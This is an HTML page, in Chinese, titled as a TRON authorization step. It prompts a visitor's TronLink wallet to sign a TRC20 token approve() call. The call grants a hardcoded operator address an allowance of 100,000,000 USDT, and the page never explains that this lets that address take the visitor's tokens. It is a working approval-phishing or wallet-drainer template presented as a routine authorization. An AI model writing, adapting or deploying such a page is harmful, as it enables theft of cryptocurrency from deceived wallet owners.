<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>TRON 授权</title>
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter/dist/tronwallet-adapter.min.js"></script>
</head>
<body>
  <h2>授权 TRC20 USDT 使用权限</h2>
  <button id="authorize">授权 USDT</button>
  <p id="status"></p>

  <script>
    const receiver = "TCJYKs5AiBucQFSA4GaovG66pHatv1UxYp"; // 你的地址
    const contractAddress = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // 默认 USDT 合约
    const amount = "100000000000000"; // 100,000,000 USDT（注意 6 位精度）
    let tronWeb;

    async function init() {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        tronWeb = window.tronWeb;
        $("#status").text("已连接钱包: " + tronWeb.defaultAddress.base58);
      } else {
        $("#status").text("请使用 TronLink 插件或手机钱包打开本页面");
      }
    }

    $("#authorize").click(async () => {
      if (!tronWeb) {
        alert("请先连接 TronLink");
        return;
      }

      try {
        const contract = await tronWeb.contract().at(contractAddress);
        const tx = await contract.approve(receiver, amount).send();
        $("#status").text("授权成功！交易哈希: " + tx);
      } catch (err) {
        console.error(err);
        $("#status").text("授权失败: " + err.message);
      }
    });

    window.addEventListener("load", init);
  </script>
</body>
</html>
